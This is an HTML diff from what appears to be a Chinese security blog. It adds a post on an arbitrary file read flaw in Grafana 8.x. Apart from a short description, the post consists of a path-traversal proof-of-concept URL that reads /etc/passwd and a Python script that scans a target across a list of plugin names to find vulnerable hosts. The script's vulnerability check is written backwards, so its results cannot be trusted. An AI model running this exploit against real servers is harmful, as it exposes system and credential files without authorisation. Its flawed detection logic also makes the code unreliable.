@@ -223,6 +223,73 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-Grafana任意文件读取" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/12/08/Grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
+      <time datetime="2021-12-08T01:59:02.000Z" itemprop="datePublished">2021-12-08</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/12/08/Grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">Grafana任意文件读取</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="什么是Grafana"><a href="#什么是Grafana" class="headerlink" title="什么是Grafana"></a>什么是Grafana</h3><p>Grafana是一款用Go语言开发的开源数据可视化工具，可以做数据监控和数据统计，带有告警功能。目前使用grafana的公司有很多，如paypal、ebay、intel等。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p><code>Grafana            8.x</code></p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP/public/plugins/插件名称/../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211208094520066.png" alt="image-20211208094520066"></p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line">args = str(sys.argv[1])</span><br><span class="line">f = open(&quot;./paload.txt&quot;)</span><br><span class="line">for line in f:</span><br><span class="line">    url = &quot;http://&quot;+args+&quot;/public/plugins/&quot;+str.rstrip(line)+&quot;/../../../../../../../../../../../etc/passwd&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">    req = requests.post(url, headers=headers,timeout=(3,7),allow_redirects=False)</span><br><span class="line">    a=req.text</span><br><span class="line">    str1=&#x27;root&#x27;</span><br><span class="line">    if a in str1:</span><br><span class="line">        print(&#x27;确认存在&#x27;+str.rstrip(line)+&#x27;路径,并存在漏洞!&#x27;)</span><br><span class="line">        print(url)</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;不存在漏洞!&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/image-20211208095615231.png" alt="image-20211208095615231"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Grafana/" rel="tag">Grafana</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-Clash配置TUN模式" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
